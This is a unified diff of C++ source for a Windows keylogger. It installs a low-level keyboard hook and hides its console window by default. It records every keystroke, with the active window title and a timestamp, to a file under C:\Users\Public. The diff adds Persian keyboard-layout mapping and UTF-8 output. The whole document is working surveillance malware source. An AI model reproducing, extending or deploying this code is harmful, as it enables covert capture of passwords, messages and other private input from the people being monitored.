@@ -1,30 +1,42 @@
+// Include necessary libraries
 #define UNICODE
 
 #include <map>
 #include <ctime>
 #include <mutex>
+#include <locale>
 #include <cstring>
 #include <fstream>
 #include <sstream>
+#include <codecvt>
+#include <iomanip>
 #include <iostream>
 #include <Windows.h>
 
+// Custom string buffer class inheriting from std::stringbuf
+class MBuf : public std::stringbuf {
+public:
+    // Override sync method to output the content to stdout
+    int sync() override {
+        fputs(str().c_str(), stdout);
+        str("");
+        return 0;
+    }
+};
 
-// defines whether the window is visible or not
-// should be solved with makefile, not in this file
+// Define whether the window is visible or not (should be solved with makefile, not in this file)
 #define invisible // (visible / invisible)
 
-// defines which format to use for logging
-// 0 for default, 10 for dec codes, 16 for hex codex
+// Define which format to use for logging (0 for default, 10 for dec codes, 16 for hex codes)
 #define FORMAT 0
 
 // defines if ignore mouse clicks
 #define mouse_ignore
 
-// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally or
-// you will get problems since every function uses this variable.
+// Variable to store the HANDLE to the hook. Declare it globally.
 #if FORMAT == 0
 
+// Map of virtual key codes to corresponding strings
 const std::map<int, std::string> key_name{
         {VK_LBUTTON,          "[LeftMouseBUTTON]"},
         {VK_RBUTTON,          "[RightMouseBUTTON]"},
@@ -97,79 +109,208 @@ const std::map<int, std::string> key_name{
         {VK_ADD,              "+"},
         {VK_SUBTRACT,         "-"},
 };
+
+// Map of English characters to Persian characters
+const std::map<std::string, std::string> eng_to_per{
+        {"Q",  "ض"},
+        {"W",  "ص"},
+        {"E",  "ث"},
+        {"R",  "ق"},
+        {"T",  "ف"},
+        {"Y",  "غ"},
+        {"U",  "ع"},
+        {"I",  "ه"},
+        {"O",  "خ"},
+        {"P",  "ح"},
+        {"[",  "ج"},
+        {"�",  "ج"},
+        {"]",  "چ"},
+        {"\\", "پ"},
+        {"A",  "ش"},
+        {"S",  "س"},
+        {"D",  "ی"},
+        {"F",  "ب"},
+        {"G",  "ل"},
+        {"H",  "ا"},
+        {"J",  "ت"},
+        {"K",  "ن"},
+        {"L",  "م"},
+        {";",  "ک"},
+        {"'",  "گ"},
+        {"Z",  "ظ"},
+        {"X",  "ط"},
+        {"C",  "ز"},
+        {"V",  "ر"},
+        {"B",  "ذ"},
+        {"N",  "د"},
+        {"M",  "ئ"},
+        {",",  "و"},
+};
+
+// Map of special English characters to Persian characters
+const std::map<std::string, std::string> special_eng_to_per{
+        {"129", "پ"},
+        {"141", "چ"},
+        {"204", "ج"},
+        {"144", "گ"},
+        {"152", "ک"},
+        {"230", "و"},
+};
 #endif
+
+// Hook handle variable
 HHOOK _hook;
 
-// This struct contains the data received by the hook callback. As you see in the callback function
-// it contains the thing you will need: vkCode = virtual key code.
-KBDLLHOOKSTRUCT kbdStruct;
+// Struct to hold data received by the hook callback
+KBDLLHOOKSTRUCT kbd_struct;
 
-int Save(int key_stroke);
+// Keep the last foreground window title
+std::string last_window;
 
+// Output file stream
 std::ofstream output_file;
 
-// This is the callback function. Consider it the event that is raised when, in this case, a key is pressed.
+// Function to convert a string to lowercase
+std::string toLowerCase(const std::string &str);
+
+// Hook callback function
+LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
+
+// Set the keyboard hook
+void setHook();
+
+// Release the keyboard hook
+void releaseHook();
+
+// Get the current time as a string
+std::string getCurrentTimeAsString();
+
+// Get the current keyboard layout language identifier
+int getCurrentKeyboardLayout();
+
+// Save the pressed key to the output file
+int save(int key_stroke);
+
+// Function to hide or show the console window
+void stealth();
+
+// Main function
+int main() {
+    // Set console output to UTF-8
+    SetConsoleOutputCP(CP_UTF8);
+    setvbuf(stdout, nullptr, _IONBF, 0);
+
+    // Create a UTF-8 locale
+    std::locale utf8_locale(std::locale(), new std::codecvt_utf8<wchar_t>);
+
+    // Set the locale for cout
+    std::wcout.imbue(utf8_locale);
+
+    // Create a custom string buffer and redirect cout to it
+    MBuf buf;
+    std::cout.rdbuf(&buf);
+
+    // open output file in append mode
+    const char *output_filename = R"(C:\Users\Public\KYLGGR.out)";
+    std::cout << "Logging output to " << output_filename << std::endl;
+    output_file.open(output_filename, std::ios_base::app);
+
+    // Set the console window visibility
+    stealth();
+
+    // Set the keyboard hook
+    setHook();
+
+    // Loop to keep the console application running.
+    MSG msg;
+    while (GetMessage(&msg, nullptr, 0, 0)) {
+    }
+}
+
+// Function to convert a string to lowercase
+std::string toLowerCase(const std::string &str) {
+    std::string result;
+    for (char ch: str) {
+        result += std::tolower(ch);
+    }
+    return result;
+}
+
+// Hook callback function
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
         // the action is valid: HC_ACTION.
         if (wParam == WM_KEYDOWN) {
-            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
-            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+            // Get the keyboard hook data
+            kbd_struct = *((KBDLLHOOKSTRUCT *) lParam);
 
-            // save to file
-            Save(kbdStruct.vkCode);
+            // Save the key to the output file
+            save(kbd_struct.vkCode);
         }
     }
 
-    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
+    // Call the next hook in the hook chain
     return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
-void SetHook() {
-    // Set the hook and set it to use the callback function above
-    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
-    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
-    // function that sets and releases the hook.
+// Set the keyboard hook
+void setHook() {
+// Set the hook and set it to use the callback function above
     if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, nullptr, 0))) {
+        // Display an error message if hook installation fails
         LPCWSTR a = L"Failed to install hook!";
         LPCWSTR b = L"Error";
         MessageBox(nullptr, a, b, MB_ICONERROR);
     }
 }
 
-void ReleaseHook() {
+// Release the keyboard hook
+void releaseHook() {
     UnhookWindowsHookEx(_hook);
 }
 
-inline std::tm localtime_xp(std::time_t timer) {
-    std::tm bt{};
-#if defined(__unix__)
-    localtime_r(&timer, &bt);
-#elif defined(_MSC_VER)
-    localtime_s(&bt, &timer);
-#else
-    static std::mutex mtx;
-    std::lock_guard<std::mutex> lock(mtx);
-    bt = *std::localtime(&timer);
-#endif
-    return bt;
+// Get the current time as a string
+std::string getCurrentTimeAsString() {
+    // Get the current time
+    std::time_t currentTime = std::time(nullptr);
+
+    // Convert the time to a string
+    std::tm *localTime = std::localtime(&currentTime);
+    std::stringstream ss;
+    ss << std::put_time(localTime, "%Y-%m-%d %H:%M:%S");
+
+    return ss.str();
 }
 
-inline std::string time_stamp(const std::string& fmt = "%F %T") { // default = "YYYY-MM-DD HH:MM:SS"
+// Get the current keyboard layout language identifier
+int getCurrentKeyboardLayout() {
+    // Get the active window handle
+    HWND foreground = GetForegroundWindow();
 
-    auto bt = localtime_xp(std::time(nullptr));
-    char buf[64];
-    return { buf, std::strftime(buf, sizeof(buf), fmt.c_str(), &bt) };
+    // Get the thread identifier of the foreground window
+    DWORD threadID = GetWindowThreadProcessId(foreground, nullptr);
+
+    // Get the keyboard layout of the thread
+    HKL layout = GetKeyboardLayout(threadID);
+
+    // Get the keyboard layout language identifier
+    LANGID languageId = LOWORD(layout);
+
+    return languageId;
 }
 
-int Save(int key_stroke) {
+// Save the pressed key to the output file
+int save(int key_stroke) {
     std::stringstream output;
-    static char last_window[256] = "";
+
 #ifndef mouse_ignore
+    // Ignore mouse clicks
     if ((key_stroke == 1) || (key_stroke == 2)) {
         return 0; // ignore mouse clicks
     }
 #endif
+
+    // Get the active window handle and keyboard layout
     HWND foreground = GetForegroundWindow();
     DWORD threadID;
     HKL layout = nullptr;
@@ -181,55 +322,80 @@ int Save(int key_stroke) {
     }
 
     if (foreground) {
-        char window_title[256];
-        GetWindowTextA(foreground, (LPSTR)window_title, 256);
+        // Get the window title
+        wchar_t window_title[256];
+        GetWindowTextW(foreground, window_title, 256);
 
-        if (strcmp(window_title, last_window) != 0) {
-            strcpy_s(last_window, window_title);
+        // Convert wide character string to UTF-8 narrow character string
+        std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
+        std::string utf8_title = converter.to_bytes(window_title);
 
-            output << "\n\n[" << time_stamp() << "] (" << window_title << ")\n";
+        // Check if the window title has changed
+        if (utf8_title != last_window) {
+            last_window = utf8_title;
+
+            // Log the window title and current time
+            output << "\n\n[" << getCurrentTimeAsString() << "] (" << utf8_title << ")\n";
         }
     }
 
+// Choose the format based on the specified FORMAT value
 #if FORMAT == 10
     output << '[' << key_stroke << ']';
+
 #elif FORMAT == 16
     output << std::hex << "[" << key_stroke << ']';
-#else
-    if (key_name.find(key_stroke) != key_name.end()) {
-        output << key_name.at(key_stroke);
-    }
-    else {
-        char key;
-        // check caps lock
-        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
-        // check shift key
-        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
-            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
-            lowercase = !lowercase;
-        }
+#else
+    // Log the key based on the key_name map and keyboard layout
+    if (key_name.find(key_stroke) != key_name.end())
+        output << key_name.at(key_stroke);
+
+    else {
+        std::string key, key_str;
 
         // map virtual key according to keyboard layout
         key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
+        key_str = std::to_string(MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout));
 
-        // tolower converts it to lowercase properly
-        if (!lowercase) {
-            key = tolower(key);
+        if (getCurrentKeyboardLayout() == 1065) { // Persian characters
+            if (eng_to_per.find(key) != eng_to_per.end())
+                output << eng_to_per.at(key);
+            else if (special_eng_to_per.find(key_str) != special_eng_to_per.end())
+                output << special_eng_to_per.at(key_str);
+            else
+                output << key;
+
+        } else { // English characters
+            // Check caps lock
+            bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+
+            // Check shift key
+            if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
+                || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
+                lowercase = !lowercase;
+
+            // Convert to lowercase if needed
+            if (!lowercase)
+                key = toLowerCase(key);
+
+            // Log the key
+            output << key;
         }
-        output << char(key);
     }
 #endif
-    // instead of opening and closing file handlers every time, keep file open and flush.
+    // Instead of opening and closing file handlers every time, keep the file open and flush.
     output_file << output.str();
     output_file.flush();
 
-    std::cout << output.str();
+    // Print the output to the console
+    std::cout << output.str() << std::flush;
 
     return 0;
 }
 
-void Stealth() {
+// Function to hide or show the console window
+void stealth() {
 #ifdef visible
     ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), 1); // visible window
 #endif
@@ -237,22 +403,4 @@ void Stealth() {
 #ifdef invisible
     ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), 0); // invisible window
 #endif
-}
-
-int main() {
-    // open output file in append mode
-    const char* output_filename = R"(C:\Users\Public\KYLGGR.out)";
-    std::cout << "Logging output to " << output_filename << std::endl;
-    output_file.open(output_filename, std::ios_base::app);
-
-    // visibility of window
-    Stealth();
-
-    // set the hook
-    SetHook();
-
-    // loop to keep the console application running.
-    MSG msg;
-    while (GetMessage(&msg, nullptr, 0, 0)) {
-    }
 }
